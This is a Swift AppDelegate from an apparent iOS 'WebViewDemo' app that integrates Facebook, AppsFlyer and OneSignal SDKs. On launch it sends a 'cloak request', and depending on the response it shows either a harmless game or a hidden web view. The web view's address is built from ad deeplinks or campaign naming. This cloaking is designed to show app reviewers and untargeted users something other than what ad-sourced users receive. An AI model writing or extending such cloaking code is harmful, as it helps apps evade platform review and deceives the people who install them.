//
//  AppDelegate.swift
//  WebViewDemo
//
//  Created by Mark Vais on 20.09.2020.
//  Copyright © 2020 Mark Vais. All rights reserved.
//

import UIKit
import FBSDKCoreKit
import OneSignal
import AppsFlyerLib

@UIApplicationMain
class AppDelegate: UIResponder, UIApplicationDelegate {
    
    let logic = NewLogic()
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        
        // MARK: - AppsFlyer
        
        
        
        // MARK: - Fb deeplinking
        
        AppEvents.activateApp()
        ApplicationDelegate.shared.application(application, didFinishLaunchingWithOptions: launchOptions)
        
        
        
        // 1 - make cloak request
        logic.checkerDataUsage() { [self] status in
            
            print("\nUser - \(status.user) \nSource - \(status.source)")
            
            // 2 - check user from cloak (true - show web, false - show game) // for game testing
            if status.user != "true" {
                UserDefaults.standard.set("false", forKey: "SHOW_WEB")
                print("\nUser not true - showing game")
                return
            }
            
            UserDefaults.standard.set("true", forKey: "SHOW_WEB")
            print("\nUser true - showing web")
            
            // 3 - user == "true" - check deeplink
            AppLinkUtility.fetchDeferredAppLink { (url, error) in
                
                if let deeplink = url?.absoluteString {
                    print(deeplink)
                    UserDefaults.standard.set(deeplink, forKey: "deeplink")
                    let deep = "\(UserDefaults.standard.object(forKey: "deeplink") ?? "")"
                    
                    logic.getDataFromDeeplink(deeplink: deep) { deeplinkData -> () in
                        
                        if deeplinkData != nil {
                            print("Deeplink data - \(deeplinkData!)")
                            logic.formLinkFromResult(deeplinkData!, status)
                            return
                        }
                    }
                    
                } else {
                    print("\nNo app link available or error fetching deferred app link\n")
                    
                    // 4 - no deeplink - check naming
                    
                    // AppsFlyerLib.fetchNaming { (naming, error) in
                        
                        //if let naming = naming?.absoluteString {
                    
                            let name = "\(UserDefaults.standard.object(forKey: "naming") ?? "")"
                        
                            logic.getDataFromNaming(naming: name, mediaSources: logic.media_sources) { namingData -> () in
                                
                                if namingData != nil {
                                    print("Naming data - \(namingData!)")
                                    logic.formLinkFromResult(namingData!, status)
                                    return
                                }
                            }
                        //} else {
                                
                            // 5 - no naming - create organic
                    
                            var computedKey: String {
                                if status.source == TrafficSource.FACEBOOK.rawValue {
                                    return Consts.ORGANIC_FB
                                } else {
                                    return Consts.ORGANIC_INAPP
                                }
                            }
                            
                            var computedSub1: String {
                                if status.source == TrafficSource.FACEBOOK.rawValue {
                                    return "organic_fb"
                                } else {
                                    return "organic_inapp"
                                }
                            }
                            
                            let organicData = ResultData(key: computedKey, sub1: computedSub1, source: TrafficSource.FACEBOOK)
                            print("Organic data - \(organicData)")
                            logic.formLinkFromResult(organicData, status)
                
                        //}
                    //}
                }
            }
        }
        
        // MARK: - OneSignal
        let onesignalInitSettings = [kOSSettingsKeyAutoPrompt: false]
        
        OneSignal.initWithLaunchOptions(launchOptions, appId: "a7e60277-d981-4310-82f1-e790e23777a4", handleNotificationAction: nil, settings: onesignalInitSettings)
        
        OneSignal.inFocusDisplayType = OSNotificationDisplayType.notification
        
        // to show the iOS push notification prompt
        //        OneSignal.promptForPushNotifications(userResponse: { accepted in
        //          print("User accepted notifications: \(accepted)")
        //        })
    
        return true
    }
    
    // MARK: - Track App Installs and App Opens
    func application(_ app: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey : Any] = [:]) -> Bool {
        ApplicationDelegate.shared.application(app, open: url, sourceApplication: options[UIApplication.OpenURLOptionsKey.sourceApplication] as? String, annotation: options[UIApplication.OpenURLOptionsKey.annotation])
        return true
    }
    
    func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -> Bool {
        ApplicationDelegate.shared.application(application, open: url, sourceApplication: sourceApplication, annotation: annotation)
        return true
    }
    
    // MARK: - UISceneSession Lifecycle
    func application(_ application: UIApplication, configurationForConnecting connectingSceneSession: UISceneSession, options: UIScene.ConnectionOptions) -> UISceneConfiguration {
        // Called when a new scene session is being created.
        // Use this method to select a configuration to create the new scene with.
        return UISceneConfiguration(name: "Default Configuration", sessionRole: connectingSceneSession.role)
    }
    
    func application(_ application: UIApplication, didDiscardSceneSessions sceneSessions: Set<UISceneSession>) {
        // Called when the user discards a scene session.
        // If any sessions were discarded while the application was not running, this will be called shortly after application:didFinishLaunchingWithOptions.
        // Use this method to release any resources that were specific to the discarded scenes, as they will not return.
    }
}
